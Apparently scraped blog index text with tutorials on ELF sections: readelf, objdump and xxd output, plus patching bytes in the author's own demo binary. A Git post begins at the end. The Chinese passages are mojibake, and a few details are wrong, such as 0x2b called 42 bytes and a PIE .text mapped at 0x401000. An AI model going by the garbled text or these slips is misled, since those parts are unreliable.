è¿™ 4 ä¸ª byteã€‚ğŸ¤£ global_data é‡æ–°è®¾ç½®ä¸º 0x12345678, æ³¨æ„æ˜¯å°ç«¯ã€‚é«˜ä½é«˜åœ°å€\n./update.sh demo 0x3010 0x78 Updated byte at offset 12304 (0x3010) to 0x78 ./update.sh demo 0x3011 0x56 Updated byte at offset 12305 (0x3011) to 0x56 ./update.sh demo 0x3012 0x34 Updated byte at offset 12306 (0x3012) to 0x34 ./update.sh demo 0x3013 0x12 Updated byte at offset 12307 (0x3013) to 0x12 ./demo Initializing... Global Data: 305419896 Global BSS: 0 Local Static: 100 Hello from .rodata! Counter: 1 Counter: 2 Counter: 3 Finalizing... .data section æ€»ç»“ Section File Offset Size (Bytes) Virtual Address Runtime Permissions .data 0x3000 0x20 (32) 0x4000 Writable + Allocated (WA) .bss section åˆ†æ [26] .bss NOBITS 0000000000004020 00003020 0000000000000010 0000000000000000 WA 0 0 4 .bss section å­—æ®µè§£é‡Š Field Value Meaning [26] Section Index The 26th section in the ELF file. Tools use this internally. .bss Section Name Stands for Block Started by Symbol. Holds uninitialized global/static variables (e.g., global_bss, count.1 in your code). NOBITS Section Type Indicates this section does not occupy space in the file (NOBITS = no bytes on disk). Memory is allocated at runtime and initialized to zero. 0000000000004020 Virtual Address (VA) At runtime, this section will be mapped to virtual address 0x4020. 00003020 File Offset In the file (demo), this section starts at byte 0x3020. Since itâ€™s NOBITS, this value is unused (placeholder for alignment/padding). 0000000000000010 Size Size of the section in memory: 0x10 (16 bytes). The OS allocates this much zeroed memory at runtime. 0000000000000000 Entry Size (EntSize) Not applicable here; set to 0 because .bss contains no fixed-size entries. WA Flags Section attributes: W = Writable (variables can be modified at runtime). A = Allocated (memory is reserved at runtime). No X â†’ not executable. 0 Link Relates to other sections; unused here. 0 Info Extra metadata; unused here. 4 Alignment Must start at an address divisible by 4 in memory. Key Takeaways Purpose of .bss\nStores uninitialized global/static variables, such as:\nint global_bss; // Uninitialized global variable static int count.1; // Static local variable in `counter()` These are zeroed out at runtime.\nNo Space in File (NOBITS)\nUnlike .data, .bss does not store values in the file. ğŸ¤” ä¸å ç”¨å­˜å‚¨ç©ºé—´ The OS allocates and initializes this section to zero during program startup. Saves disk space: zero-filled regions donâ€™t need explicit storage. Runtime Allocation\nVirtual Address: 0x4020 (where .bss lives in memory). Size: 0x10 (16 bytes) â†’ covers all uninitialized variables. Example: global_bss is 4 bytes and count.1 is 4 bytes Flags: WA (Writable + Allocated)\nWritable: Variables like global_bss can be modified at runtime. Allocated: Reserved in memory, but not stored in the file. File Offset: 0x3020\nExists only for padding/alignment in the file. Ignored by the OS because .bss is NOBITS. Alignment: 4\nEnsures efficient memory access by aligning the section to 4-byte boundaries. Why .bss Is Efficient Disk Space: Does not duplicate zeros in the file (saves space). Memory: Zeroed at runtime by the OS using calloc-like behavior. Security: Prevents leaking old memory contents (ensures clean state). uninitialized global variable ä¹‹ global_bss global_bss ç¬¦å·ä¿¡æ¯ nm demo | grep global_bss 0000000000004024 B global_bss uninitialized static local variable ä¹‹ count count ç¬¦å·ä¿¡æ¯ nm demo | grep count.1 0000000000004028 b count.1 ä¸å ç”¨å­˜å‚¨ç©ºé—´çš„ bss [25] .data PROGBITS 0000000000004000 00003000 0000000000000020 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000004020 00003020 0000000000000010 0000000000000000 WA 0 0 4 [27] .comment PROGBITS 0000000000000000 00003020 000000000000002b 0000000000000001 MS 0 0 1 demo ä¸­ 25ã€26ã€27 ä¸‰ä¸ª section å¸ƒå±€ +---------------------+ 0x3000 (start of .data) | 0x20(32 bytes) +---------------------+ 0x3020 (end of .bss, start of .bss, end of .bss, start of .comment) | 0x2b(42 bytes) +---------------------+ 0x304b (end of .comment) .bss section åœ¨ demo ä¸­ä¸å å®é™…çš„å­˜å‚¨ç©ºé—´\n.bss section æ€»ç»“ Section File Offset Size (Bytes) Virtual Address Runtime Permissions Content Type .bss 0x3020 0x0 (no bits stored) 0x4020 Writable + Allocated (WA) Uninitialized variables (zeroed at runtime) .text section åˆ†æ .text å­—æ®µè§£é‡Š Field Value Meaning [16] Section index .text is the 16th section in the ELF file. .text Section name Contains machine code (compiled functions). PROGBITS Section type Data is stored in the file (not NOBITS). 0000000000001080 Virtual Address (VA) This section is mapped to virtual address 0x1080 (relative to the randomized PIE base address). 00001080 File Offset Start of the .text section in the file: byte 0x1080 (4224 in decimal). 00000000000001fb Size Size of the .text section: 0x1fb bytes (507 bytes). 0000000000000000 Entry Size (EntSize) Not used for .text (applies to sections with fixed-size entries, like .symtab). AX Flags Section attributes: A = Allocated (loaded into memory). X = Executable (code can run as machine instructions). 0 Link Unused for .text (used for symbol tables). 0 Info Unused for .text (used for .text with extra metadata). 16 Alignment Must be aligned to a 16-byte boundary in memory. Virtual Address = 0000000000001080 å’Œ readelf -h æŸ¥çœ‹çš„ entry point address ä¸€è‡´\nKey Takeaways Purpose of .text:\nContains compiled machine code (e.g., main(), counter(), print_message()). Stored in the file and loaded into memory as executable code. Virtual Address (VA):\nAt runtime, the .text section starts at virtual address 0x1080 (relative to the base address chosen by ASLR). Example: If the base address is 0x555555554000, .text starts at 0x555555555080. File Offset:\nIn the file (demo), .text starts at byte 0x1080 (4224 in decimal). This is where the compiler stores the raw machine code for your functions. Size: 0x1fb (507 bytes):\nTotal size of the .text section in both the file and memory. Spans from 0x1080 to 0x1080 + 0x1fb = 0x127b. Flags: AX (Allocated + eXecutable):\nMemory is marked executable (X), allowing CPU to run the code. Memory is allocated (A), but not writable (W). Alignment: 16:\nEnsures the .text section starts at a 16-byte aligned address in memory. Optimizes instruction cache and CPU performance. .text section ä¹‹ counter function åˆ†æ void counter() { static int count = 0; count++; printf(\"Counter: %d\\n\", count); } counter ç¬¦å·ä¿¡æ¯ nm demo | grep counter 0000000000001169 T counter objdump æŸ¥çœ‹ counter objdump demo --disassemble=counter demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 0000000000001169 \u003ccounter\u003e: 1169: f3 0f 1e fa endbr64 116d: 55 push %rbp 116e: 48 89 e5 mov %rsp,%rbp 1171: 8b 05 b1 2e 00 00 mov 0x2eb1(%rip),%eax # 4028 \u003ccount.1\u003e 1177: 83 c0 01 add $0x1,%eax 117a: 89 05 a8 2e 00 00 mov %eax,0x2ea8(%rip) # 4028 \u003ccount.1\u003e 1180: 8b 05 a2 2e 00 00 mov 0x2ea2(%rip),%eax # 4028 \u003ccount.1\u003e 1186: 89 c6 mov %eax,%esi 1188: 48 8d 05 89 0e 00 00 lea 0xe89(%rip),%rax # 2018 \u003c_IO_stdin_used+0x18\u003e 118f: 48 89 c7 mov %rax,%rdi 1192: b8 00 00 00 00 mov $0x0,%eax 1197: e8 d4 fe ff ff call 1070 \u003cprintf@plt\u003e 119c: 90 nop 119d: 5d pop %rbp 119e: c3 ret Disassembly of section .fini: .text section ä¹‹ print_message function åˆ†æ void print_message() { printf(\"%s\\n\", message); } print_message ç¬¦å·ä¿¡æ¯ nm demo | grep print_message 00000000000011d3 T print_message objdump æŸ¥çœ‹ print_message objdump demo --disassemble=print_message demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000011d3 \u003cprint_message\u003e: 11d3: f3 0f 1e fa endbr64 11d7: 55 push %rbp 11d8: 48 89 e5 mov %rsp,%rbp 11db: 48 8b 05 36 2e 00 00 mov 0x2e36(%rip),%rax # 4018 \u003cmessage\u003e 11e2: 48 89 c7 mov %rax,%rdi 11e5: e8 76 fe ff ff call 1060 \u003cputs@plt\u003e 11ea: 90 nop 11eb: 5d pop %rbp 11ec: c3 ret Disassembly of section .fini: .text section ä¹‹ main function åˆ†æ main ç¬¦å·ä¿¡æ¯ nm demo | grep main U __libc_start_main@GLIBC_2.34 00000000000011ed T main objdump æŸ¥çœ‹ main objdump demo --disassemble=main demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000011ed \u003cmain\u003e: 11ed: f3 0f 1e fa endbr64 11f1: 55 push %rbp 11f2: 48 89 e5 mov %rsp,%rbp 11f5: 48 83 ec 10 sub $0x10,%rsp 11f9: 8b 05 11 2e 00 00 mov 0x2e11(%rip),%eax # 4010 \u003cglobal_data\u003e 11ff: 89 c6 mov %eax,%esi 1201: 48 8d 05 3b 0e 00 00 lea 0xe3b(%rip),%rax # 2043 \u003c_IO_stdin_used+0x43\u003e 1208: 48 89 c7 mov %rax,%rdi 120b: b8 00 00 00 00 mov $0x0,%eax 1210: e8 5b fe ff ff call 1070 \u003cprintf@plt\u003e 1215: 8b 05 09 2e 00 00 mov 0x2e09(%rip),%eax # 4024 \u003cglobal_bss\u003e 121b: 89 c6 mov %eax,%esi 121d: 48 8d 05 30 0e 00 00 lea 0xe30(%rip),%rax # 2054 \u003c_IO_stdin_used+0x54\u003e 1224: 48 89 c7 mov %rax,%rdi 1227: b8 00 00 00 00 mov $0x0,%eax 122c: e8 3f fe ff ff call 1070 \u003cprintf@plt\u003e 1231: 8b 05 dd 2d 00 00 mov 0x2ddd(%rip),%eax # 4014 \u003clocal_static.0\u003e 1237: 89 c6 mov %eax,%esi 1239: 48 8d 05 24 0e 00 00 lea 0xe24(%rip),%rax # 2064 \u003c_IO_stdin_used+0x64\u003e 1240: 48 89 c7 mov %rax,%rdi 1243: b8 00 00 00 00 mov $0x0,%eax 1248: e8 23 fe ff ff call 1070 \u003cprintf@plt\u003e 124d: b8 00 00 00 00 mov $0x0,%eax 1252: e8 7c ff ff ff call 11d3 \u003cprint_message\u003e 1257: c7 45 fc 00 00 00 00 movl $0x0,-0x4(%rbp) 125e: eb 0e jmp 126e \u003cmain+0x81\u003e 1260: b8 00 00 00 00 mov $0x0,%eax 1265: e8 ff fe ff ff call 1169 \u003ccounter\u003e 126a: 83 45 fc 01 addl $0x1,-0x4(%rbp) 126e: 83 7d fc 02 cmpl $0x2,-0x4(%rbp) 1272: 7e ec jle 1260 \u003cmain+0x73\u003e 1274: b8 00 00 00 00 mov $0x0,%eax 1279: c9 leave 127a: c3 ret Disassembly of section .fini: .text section ä¹‹ initialize function åˆ†æ objdump æŸ¥çœ‹ initialize objdump demo --disassemble=initialize demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 00000000000011b9 \u003cinitialize\u003e: 11b9: f3 0f 1e fa endbr64 11bd: 55 push %rbp 11be: 48 89 e5 mov %rsp,%rbp 11c1: 48 8d 05 6b 0e 00 00 lea 0xe6b(%rip),%rax # 2033 \u003c_IO_stdin_used+0x33\u003e 11c8: 48 89 c7 mov %rax,%rdi 11cb: e8 90 fe ff ff call 1060 \u003cputs@plt\u003e 11d0: 90 nop 11d1: 5d pop %rbp 11d2: c3 ret Disassembly of section .fini: .text section ä¹‹ finalize function åˆ†æ objdump æŸ¥çœ‹ finalize objdump demo --disassemble=finalize demo: file format elf64-x86-64 Disassembly of section .init: Disassembly of section .plt: Disassembly of section .plt.got: Disassembly of section .plt.sec: Disassembly of section .text: 000000000000119f \u003cfinalize\u003e: 119f: f3 0f 1e fa endbr64 11a3: 55 push %rbp 11a4: 48 89 e5 mov %rsp,%rbp 11a7: 48 8d 05 77 0e 00 00 lea 0xe77(%rip),%rax # 2025 \u003c_IO_stdin_used+0x25\u003e 11ae: 48 89 c7 mov %rax,%rdi 11b1: e8 aa fe ff ff call 1060 \u003cputs@plt\u003e 11b6: 90 nop 11b7: 5d pop %rbp 11b8: c3 ret Disassembly of section .fini: Security Implications NX Bit (No-eXecute):\nThe .text section is executable (X), but not writable (W), preventing code injection. ASLR (Address Space Layout Randomization):\nVirtual addresses like 0x1080 are offsets from a randomized base address: Runtime Address of _init = `Base` + 0x1000 Runtime Address of main = `Base` + 0x11ed Memory Mapping at Runtime When you run ./demo, the OS maps the .text section into memory with execute permissions:\ncat /proc/self/maps Output (example):\n555555555000-555555556000 r-xp 0x1000 ./demo r-xp: Read + eXecute, not Writable. 0x1000: File offset for .text. 0x1fb: Size of .text (507 bytes). .text æ€»ç»“ Section Purpose Virtual Address File Offset Size (Bytes) Permissions Notes .text Executable code 0x1080 0x1080 0x1fb (507) r-x Not writable (security) This section is critical for program execution, containing all your compiled functions and runtime initialization code.\n.rodata section åˆ†æ [18] .rodata PROGBITS 0000000000002000 00002000 0000000000000076 0000000000000000 A 0 0 4 .rodata section å­—æ®µè§£é‡Š Field Value Meaning [18] Section index .rodata is the 18th section in the ELF file. .rodata Section name Holds read-only data (constants, string literals, etc.). PROGBITS Section type Data is stored in the file (not dynamically generated). 0000000000002000 Virtual Address (VA) At runtime, this section is mapped to memory address 0x2000 (relative to the randomized PIE base address). 00002000 File Offset In the file (demo), .rodata starts at byte 0x2000 (8192 in decimal). 0000000000000076 Size Size of .rodata section: 0x76 (118 bytes). 0000000000000000 Entry Size (EntSize) Not applicable (no fixed-size entries). A Flags Section is Allocated (loaded into memory). No W or X â†’ read-only. 0 Link Unused for .rodata. 0 Info Unused for .rodata. 4 Alignment Must be aligned to 4-byte boundaries in memory. Purpose of .rodata The .rodata section stores read-only data that doesnâ€™t change during execution:\nString literals: e.g., \"Hello from .rodata!\". Constant variables: e.g., const int x = 42;. Jump tables: Used for switch() statements. Build metadata: e.g., __abi_tag, BuildID. Why Is .rodata Read-Only? Security: Prevents runtime modification of constants (e.g., format strings, lookup tables). Optimization: Shared across processes (e.g., libcâ€™s string constants). Memory Protection: Violations (e.g., writing to .rodata) cause segmentation faults. Memory Mapping at Runtime When the program runs:\nThe OS maps .rodata to virtual address 0x2000 (relative to the randomized base address). .rodata is marked read-only in memory (no write permissions). Example /proc/self/maps output:\n555555556000-555555557000 r--p 0x2000 ./demo r--p: Read-only, not writable or executable. Security Implications NX Bit (No-eXecute):\n.rodata is not executable, preventing code injection. Writable Protection:\nAttempting to modify .rodata at runtime (e.g., via a casted pointer) will crash the program: char *s = (char *)\"Hello from .rodata!\"; s[0] = 'h'; // Will cause a segmentation fault ASLR Compatibility:\n.rodata is part of the randomized memory layout in PIE binaries. Key Takeaways Concept Value Notes Section Type PROGBITS Contains actual data in the file. Virtual Address 0x2000 Runtime address (relative to PIE base). File Offset 0x2000 String \"Hello from .rodata!\" is stored here on disk. Size 0x76 (118 bytes) Total space used by .rodata. Flags A (Allocated) Loaded into memory as read-only. Alignment 4 Must start at a 4-byte aligned address. æŸ¥çœ‹ demo ä¸­ 0x2000(.rodata) å 0x76(118) å­—èŠ‚çš„å†…å®¹ xxd -l 0x76 -s 0x2000 demo 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ....Hello from . 00002010: 726f 6461 7461 2100 436f 756e 7465 723a rodata!.Counter: 00002020: 2025 640a 0046 696e 616c 697a 696e 672e %d..Finalizing. 00002030: 2e2e 0049 6e69 7469 616c 697a 696e 672e ...Initializing. 00002040: 2e2e 0047 6c6f 6261 6c20 4461 7461 3a20 ...Global Data: 00002050: 2564 0a00 476c 6f62 616c 2042 5353 3a20 %d..Global BSS: 00002060: 2564 0a00 4c6f 6361 6c20 5374 6174 6963 %d..Local Static 00002070: 3a20 2564 0a00 : %d.. demo ä¸­ 0x2000(.rodata) å 0x76(118) å­—èŠ‚çš„å†…å®¹åˆ†æ 0x20 space å±•ç¤ºç”¨ @ ä»£æ›¿ 0x0a line feed å±•ç¤ºç”¨ # ä»£æ›¿ 0x00 null ä½œä¸ºå­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼Œå±•ç¤ºç”¨ ğŸ˜‚ ä»£æ›¿ 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ....Hello@from@. 00002010: 726f 6461 7461 2100 436f 756e 7465 723a rodata!ğŸ˜‚Counter: 00002020: 2025 640a 0046 696e 616c 697a 696e 672e @%d#ğŸ˜‚Finalizing. 00002030: 2e2e 0049 6e69 7469 616c 697a 696e 672e ..ğŸ˜‚Initializing. 00002040: 2e2e 0047 6c6f 6261 6c20 4461 7461 3a20 ..ğŸ˜‚Global@Data:@ 00002050: 2564 0a00 476c 6f62 616c 2042 5353 3a20 %d#ğŸ˜‚Global@BSS:@ 00002060: 2564 0a00 4c6f 6361 6c20 5374 6174 6963 %d#ğŸ˜‚Local@Static 00002070: 3a20 2564 0a00 :@%d#ğŸ˜‚ The .rodata sectionâ€™s 4-byte alignment ensures that the section itself starts at a 4-byte aligned address in both the file and memory, but individual strings inside it do not need to be 4byte aligned.\nSection Alignment vs. Internal Data Alignment Section Alignment Align: 4 in readelf -S means the .rodata section must start at an address divisible by 4 in memory and in the file. In your file: File Offset: 0x2000 (8192) â†’ divisible by 4 (0x2000 % 4 = 0). In memory: Virtual Address: 0x2000 â†’ also divisible by 4 (0x2000 % 4 = 0). This alignment is enforced for efficient memory access, not for internal strings. Internal Strings Are Packed The compiler places strings sequentially in .rodata without padding between them. Example from your hex dump: 00002000: 0100 0200 4865 6c6c 6f20 6672 6f6d 202e ^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ __abi_tag \"Hello from .rodata!\\0\" \"Hello from .rodata!\\0\" starts at 0x2004 (after the 4-byte header). Next string \"Global Data: %d\\n\\0\" starts at 0x2018 (no padding between 0x2014 and 0x2018). How Alignment Affects Storage Even though the section is aligned to 4 bytes, the compiler packs strings tightly to save space. Alignment only matters for:\nSection Start: Ensures the entire .rodata section begins at a 4byte boundary. Data Access: If code accesses parts of .rodata as 4byte aligned values (e.g., via pointer arithmetic), the compiler ensures those values are aligned. ä¿®æ”¹ message ä¿¡æ¯ Hello from .rodata! ä¿®æ”¹ä¸º ABCDE from .rodata!\n./update.sh demo 0x2004 0x41 Updated byte at offset 8196 (0x2004) to 0x41 ~/elf-demo$ ./update.sh demo 0x2005 0x42 Updated byte at offset 8197 (0x2005) to 0x42 ~/elf-demo$ ./update.sh demo 0x2006 0x43 Updated byte at offset 8198 (0x2006) to 0x43 ~/elf-demo$ ./update.sh demo 0x2007 0x44 Updated byte at offset 8199 (0x2007) to 0x44 ~/elf-demo$ ./update.sh demo 0x2008 0x45 Updated byte at offset 8200 (0x2008) to 0x45 ~/elf-demo$ ./demo Initializing... Global Data: 42 Global BSS: 0 Local Static: 100 ABCDE from .rodata! # ä¿®æ”¹æˆåŠŸğŸ¤£ Counter: 1 Counter: 2 Counter: 3 Finalizing... .rodata section æ€»ç»“ 4byte alignment applies to the section itself, not individual strings. __abi_tag adds 4 bytes to .rodata. Null terminators add 7 bytes (1 per string). ","text-section-åˆ†æ#\u003ccode\u003e.text\u003c/code\u003e section åˆ†æ":"","ç¤ºä¾‹ä»£ç #ç¤ºä¾‹ä»£ç ":""},"title":"Master Elf Sections"},"/blog/master-elf/":{"data":{"":"","elf-file-layout#\u003cstrong\u003eELF File Layout\u003c/strong\u003e":"","elf-file-structure#\u003cstrong\u003eELF File Structure\u003c/strong\u003e":"","example-full-flow-for#\u003cstrong\u003eExample: Full Flow for \u003ccode\u003ehello\u003c/code\u003e\u003c/strong\u003e":"hello world #include \u003cstdio.h\u003e int main() { printf(\"hello world\\n\"); } gcc â€“save-temps -o hello hello.c\nWhat is ELF? ELF (Executable and Linkable Format) is a standardized binary format for storing compiled programs, libraries, and other binaries on Unix-like systems (e.g., Linux). It defines how machine code, data, symbols, relocation information, and metadata are organized in files like:\nExecutables (./hello) Object files (hello.o) Shared libraries (.so) Core dumps ELF File Structure An ELF file has two primary views:\nLinking View (Sections) Used during compilation/linking to combine object files. Contains section headers describing discrete parts of the file. Execution View (Segments) Used at runtime to load the program into memory. Contains program headers mapping sections to memory segments. Key Components Component Purpose ELF Header Metadata about the file (architecture, type, entry point, etc.). Program Headers Describe how to map segments to memory (used by the OS at runtime). Section Headers List all sections (code, data, symbols, relocations, debug info, etc.). Sections Logical units like .text (code), .data (initialized variables), etc. Segments Physical chunks mapped into memory (e.g., LOAD, DYNAMIC, STACK). ELF File Layout +---------------------+ | ELF Header | â† Fixed-size metadata at file offset 0 +---------------------+ | Program Headers | â† Describes segments (for runtime) +---------------------+ | Section 1 (.text) | â† Machine code +---------------------+ | Section 2 (.data) | â† Initialized global/static variables +---------------------+ | ... | +---------------------+ | Section Headers | â† Table listing all sections +---------------------+ Key ELf Concepts ELF Header Use readelf -h hello to see:\nELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Position-Independent Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x1060 Start of program headers: 64 (bytes into file) Start of section headers: 13976 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 13 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 30 Program Headers (Segments) Use readelf -l hello to see:\nElf file type is DYN (Position-Independent Executable file) Entry point 0x1060 There are 13 program headers, starting at offset 64 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 0x00000000000002d8 0x00000000000002d8 R 0x8 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000628 0x0000000000000628 R 0x1000 LOAD 0x0000000000001000 0x0000000000001000 0x0000000000001000 0x0000000000000175 0x0000000000000175 R E 0x1000 LOAD 0x0000000000002000 0x0000000000002000 0x0000000000002000 0x00000000000000f4 0x00000000000000f4 R 0x1000 LOAD 0x0000000000002db8 0x0000000000003db8 0x0000000000003db8 0x0000000000000258 0x0000000000000260 RW 0x1000 DYNAMIC 0x0000000000002dc8 0x0000000000003dc8 0x0000000000003dc8 0x00000000000001f0 0x00000000000001f0 RW 0x8 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 NOTE 0x0000000000000368 0x0000000000000368 0x0000000000000368 0x0000000000000044 0x0000000000000044 R 0x4 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 0x0000000000000030 0x0000000000000030 R 0x8 GNU_EH_FRAME 0x0000000000002010 0x0000000000002010 0x0000000000002010 0x0000000000000034 0x0000000000000034 R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000002db8 0x0000000000003db8 0x0000000000003db8 0x0000000000000248 0x0000000000000248 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 03 .init .plt .plt.got .plt.sec .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .dynamic .got .data .bss 06 .dynamic 07 .note.gnu.property 08 .note.gnu.build-id .note.ABI-tag 09 .note.gnu.property 10 .eh_frame_hdr 11 12 .init_array .fini_array .dynamic .got segment LOAD ç†è§£ Explanation of the Two Lines in the LOAD Segment Hereâ€™s a breakdown of the two lines from the LOAD segment in your readelf -l hello output:\nLOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000628 0x0000000000000628 R 0x1000 Line-by-Line Breakdown Field Value Meaning Type LOAD This segment is loaded into memory during execution. Offset 0x0000000000000000 Start of this segment in the file (offset 0 bytes from the file start). VirtAddr 0x0000000000000000 Virtual memory address where this segment is mapped (position-independent; resolved at runtime). PhysAddr 0x0000000000000000 Physical memory address (ignored for executables; used in firmware). FileSiz 0x0000000000000628 (1576 bytes) Size of the segment in the file. MemSiz 0x0000000000000628 (1576 bytes) Size of the segment in memory (same as FileSiz; no zero-filled padding). Flags R Segment is read-only. Align 0x1000 (4096 bytes) Alignment requirement (must be page-aligned in memory). Purpose of This Segment This LOAD segment maps read-only metadata into memory, including:\n.interp: Path to the dynamic linker (/lib64/ld-linux-x86-64.so.2). .note.gnu.build-id: Unique identifier for debugging. .gnu.hash, .dynsym, .dynstr: Dynamic symbol table and hashing for efficient symbol resolution. Relocation tables: Used by the dynamic linker to adjust addresses at runtime. It is critical for dynamic linking and runtime symbol resolution.\nWhy Are VirtAddr and PhysAddr Zero? Position-Independent Executable (PIE):\nThe binary is compiled as DYN (shared object style), allowing the OS to load it at a randomized base address (ASLR). At runtime, the OS chooses a base address (e.g., 0x555555554000), and all segments are mapped relative to this base. VirtAddr = 0 means the segmentâ€™s virtual address is calculated as base + offset. Security Implications No Write or Execute Permissions:\nThe R flag ensures this segment is read-only, protecting metadata from tampering. Alignment (0x1000):\nEnsures the segment starts at a page boundary (4KB), satisfying memory protection requirements. Example Mapping in Memory At runtime, the OS maps this segment as follows:\nVirtual Address Range Permissions Purpose [BASE_ADDR] R .interp, .note.gnu.build-id, .gnu.hash, .dynsym, etc. [BASE_ADDR + 0x628] ... Next segment starts here. Key Takeaways Metadata Storage: Contains essential runtime data for dynamic linking. ASLR Compatibility: Position-independent addressing enhances security. Read-Only Protection: Prevents accidental or malicious modification of critical data. Sections Use readelf -S hello to list sections:\nSection Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 [ 1] .text PROGBITS 0000000000401000 00001000 00000000000001b2 0000000000000000 AX 0 0 16 ... .text: Executable code. .rodata: Read-only constants (e.g., strings). .plt/.got: Dynamic linking stubs. .symtab: Symbol table for debugging/linking. How Does ELF Work? Compilation:\nGCC generates an ELF object file (hello.o) with sections like .text, .data, and .symtab. Linking:\nThe linker (ld) merges sections from multiple object files, resolves symbols, and creates an executable ELF file with program headers. Execution:\nThe OS loads the executable using the program headers to map memory regions and execute code. What Does the OS Do When Running ./hello? Hereâ€™s the lifecycle from command line to execution:\nUser Runs the Command ./hello The shell calls execve(\"./hello\", ...), which triggers the kernel to load the ELF file.\nKernel Reads the ELF Header Checks the magic number (\\x7fELF) to confirm itâ€™s an ELF file. Parses the ELF header to determine architecture (e.g., x86-64). Kernel Loads Segments into Memory Using the program headers, the kernel:\nMaps .text (code) to executable memory. Maps .data and .bss to writable memory. Sets up the stack and environment variables. If thereâ€™s a INTERP segment, loads the dynamic linker (e.g., /lib64/ld-linux-x86-64.so.2). Dynamic Linking (if needed) If the program uses shared libraries:\nThe kernel transfers control to the dynamic linker. The linker resolves dependencies (e.g., libc.so.6), loads libraries, and relocates addresses. Start Execution The kernel jumps to the entry point specified in the ELF header (Entry point address). For C programs, this is typically _start (in crt1.o), which initializes the C runtime, calls main(), and exits cleanly. Example: Full Flow for hello $ gcc -o hello hello.c # Compiles to ELF executable File Type: file hello hello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce69e228b62365b698bac3bf837cb1c5668a8079, for GNU/Linux 3.2.0, not stripped ldd hello linux-vdso.so.1 (0x00007fffdd6be000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007cdea5a00000) /lib64/ld-linux-x86-64.so.2 (0x00007cdea5db7000) Entry Point: $ readelf -h hello | grep \"Entry point\" Entry point address: 0x1060 Execution Steps: Kernel maps the .text segment to 0x401000. Starts executing _start (assembler boilerplate). Calls __libc_start_main() (glibc initialization). Invokes main() â†’ prints \"Hello, world!\". Returns to the kernel via exit(0). Tools to Inspect ELF Files Tool Purpose readelf Analyze headers, sections, symbols. objdump Disassemble code, view relocations. nm List symbols (functions/variables). gdb Debug and inspect memory layout. strings Extract human-readable strings. Summary Workflow Source Code â†’ gcc -c â†’ ELF Object File (hello.o) Object Files â†’ ld â†’ ELF Executable (hello) OS Loads ELF â†’ Maps Memory Segments â†’ Resolves Dependencies â†’ Executes Code By understanding ELF, you gain insight into how software interacts with hardware, memory, and the operating system at the lowest level.","hello-world#hello world":"","how-does-elf-work#\u003cstrong\u003eHow Does ELF Work?\u003c/strong\u003e":"","key-components#Key Components":"","key-elf-concepts#\u003cstrong\u003eKey ELf Concepts\u003c/strong\u003e":"","references#References":" linkers wiki-linker ","what-does-the-os-do-when-running#\u003cstrong\u003eWhat Does the OS Do When Running \u003ccode\u003e./hello\u003c/code\u003e?\u003c/strong\u003e":"","what-is-elf#\u003cstrong\u003eWhat is ELF?\u003c/strong\u003e":""},"title":"Master Elf"},"/blog/master-git/":{"data":{"":"","fast-forward-merge#Fast-forward Merge":"","git-add--git-commit--git-branch-å›¾è§£#git add | git commit | git branch å›¾è§£":"","git-branch#git branch":"","git-init#git init":"","reference#Reference":"git init Create an empty Git repository or reinitialize an existing one ä¹Ÿå³æ˜¯å‘ working directory é‡Œæ·»åŠ  .git æ–‡ä»¶å¤¹\n.git/ â”œâ”€â”€ branches # git åˆ†æ”¯ â”œâ”€â”€ config # git é…ç½® â”œâ”€â”€ description â”œâ”€â”€ HEAD # HEAD æŒ‡é’ˆ, æŒ‡å‘å½“å‰åˆ†æ”¯æœ€æ–°çš„ commit â”œâ”€â”€ hooks â”‚Â â”œâ”€â”€ applypatch-msg.sample â”‚Â â”œâ”€â”€ commit-msg.sample â”‚Â â”œâ”€â”€ fsmonitor-watchman.sample â”‚Â â”œâ”€â”€ post-update.sample â”‚Â â”œâ”€â”€ pre-applypatch.sample â”‚Â â”œâ”€â”€ pre-commit.sample â”‚Â â”œâ”€â”€ prepare-commit-msg.sample â”‚Â â”œâ”€â”€ pre-push.sample 